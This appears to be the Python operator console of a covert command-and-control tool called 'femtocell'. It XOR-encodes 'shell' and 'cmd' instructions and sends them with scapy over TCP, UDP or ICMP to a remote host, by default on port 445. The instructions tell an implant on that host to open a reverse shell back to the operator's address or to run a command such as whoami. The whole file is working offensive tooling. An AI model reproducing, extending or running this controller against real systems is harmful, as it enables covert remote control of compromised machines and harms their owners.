from re import A
import scapy.all as scapy
from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
# from prompt_toolkit.contrib.completers import WordCompleter
import click

""" 
set
- mode (shell vs cmd)
- transport (i/u/t)
- lhost (get from eth adapter)
- rhost (REQUIRED)
- lport (6006)
- rport (445)
- command (whoami)
- if mode is shell, listen on lhost:lport
- if mode is cmd, use cmd option
show
- all



"""

def xor_encrypt(byte_msg, byte_key):
    encrypt_byte = b''
    for b in byte_msg:
        # print(byte_msg, byte_key, b)
        encrypt_byte += chr(b ^ byte_key).encode()
    return encrypt_byte

def print_help():
    print("read the fucking readme")

def main():
    print("""
    ____               __                  ____
   / __/__  ____ ___  / /_____  ________  / / /
  / /_/ _ \/ __ `__ \/ __/ __ \/ ___/ _ \/ / / 
 / __/  __/ / / / / / /_/ /_/ / /__/  __/ / /  
/_/  \___/_/ /_/ /_/\__/\____/\___/\___/_/_/   

    ~ kindtime & jake

    """)
# base params
# cmd params
# shell params

    params = {
        "mode":"cmd", 
        "transport":"tcp", 
        "lhost": "",
        "rhost": "",
        "lport": 6006,
        "rport": 445,
        "command": "whoami"
    }
    # SQLCompleter = WordCompleter(['select', 'from', 'insert', 'update', 'delete', 'drop'],ignore_case=True)

    while(True):
        user_in = prompt(u'femtocell ~ ',
                        history=FileHistory('history/main.history'),
                        auto_suggest=AutoSuggestFromHistory(),
                        # completer=SQLCompleter,
                        ).split()
        # click.echo_via_pager(user_input)

        
        # user_in = input("femtocell ~ ").split()

        if(len(user_in) > 1):
            user_cmd = user_in[0]
            if(user_cmd == "set"):
                params[user_in[1]] = user_in[2]
                if user_in[1] == "mode":
                    prompt2(params)
            if(user_cmd == "show"):
                if(user_in[1] == "all"):
                    print(str(params))
                else:
                    print(params[user_in[1]])
        elif len(user_in) == 1:
            if user_in[0] == "exit":
                exit()
        else:
            print_help()

def prompt2(params):
    while True:
        user_in = prompt(f'femtocell ({params["mode"]}) ~ ',
                        history=FileHistory('history/cmd.history'),
                        auto_suggest=AutoSuggestFromHistory(),
                        # completer=SQLCompleter,
                        ).split()
        
        if user_in[0] == "exit":
            return

        if params["mode"] == "shell":
            plaintext = "FC-SH-{}\00".format(params["lhost"])
            encrypted = xor_encrypt(plaintext.encode(), 0x10)
        elif params["mode"] == "cmd":
            plaintext = "FC-CM-{}\00".format(params["command"])
            encrypted = xor_encrypt(plaintext.encode(), 0x10)
        else:			
            continue

        if(params["transport"] == "udp"):
            scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
            scapy.UDP(sport=params["lport"], dport=params["rport"])/encrypted)
        elif(params["transport"] == "tcp"):
            scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
            scapy.TCP(sport=params["lport"], dport=params["rport"], flags="AP")/encrypted)
        elif(params["transport"] == "icmp"):
            scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
            scapy.ICMP(code=1, type=8)/encrypted)	

        print(user_in)


    # std = "FC-SH-192.168.10.162\00"
    # encrypted = xor_encrypt(std.encode(), 0x10)

    # print(encrypted.decode())

    # # scapy.send(scapy.IP(dst="192.168.183.152".encode(), src="192.168.10.162".encode())/scapy.ICMP(code=1, type=8)/encrypted)
    # # scapy.send(scapy.IP(dst="192.168.183.152".encode(), src="192.168.183.1".encode())/scapy.TCP(sport=6006, dport=135, flags="AP")/encrypted)
    # scapy.send(scapy.IP(dst="192.168.183.152".encode(), src="192.168.183.1".encode())/scapy.UDP(sport=6006, dport=6969)/encrypted)

if(__name__ == "__main__"):
    main()